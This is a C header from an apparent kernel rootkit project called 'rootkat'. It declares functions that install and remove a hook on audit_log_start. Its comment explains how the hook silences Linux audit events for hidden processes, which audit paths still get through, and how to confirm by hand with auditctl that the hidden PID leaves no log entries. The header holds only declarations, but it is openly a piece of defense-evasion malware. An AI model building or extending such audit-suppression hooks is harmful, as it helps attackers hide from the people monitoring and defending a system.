/* SPDX-License-Identifier: MIT */
#ifndef ROOTKAT_HOOK_AUDIT_H
#define ROOTKAT_HOOK_AUDIT_H

/*
 * audit_log_start hook — suppresses audit events emitted in the
 * context of hidden PIDs. Returning NULL is the documented "skip
 * audit" path (callers do `if (!ab) return;` and `audit_log_format`
 * on NULL is a no-op), so this is a safe drop.
 *
 * Coverage: any audit point that goes through audit_log_start. That's
 * the canonical entry; some specialized paths (audit_log_user_avc_msg
 * on SELinux-enabled kernels, kAudit's own internal audit_log) bypass
 * it. Defenders running auditd with CONFIG_AUDITSYSCALL=y still see
 * events that come from other emission points; this hook hits the
 * 90% case (per-process syscall-driven audit).
 *
 * Not CI-asserted — auditd setup in cloud-init is fragile and we
 * deliberately don't bake it into the QEMU harness. Verify manually
 * with `auditctl -a always,exit -F arch=b64 -S openat -F pid=<HIDDEN>`
 * and observe no /var/log/audit/audit.log entries for the hidden PID.
 */
int rootkat_hook_audit_log_start_install(void);
void rootkat_hook_audit_log_start_remove(void);

#endif
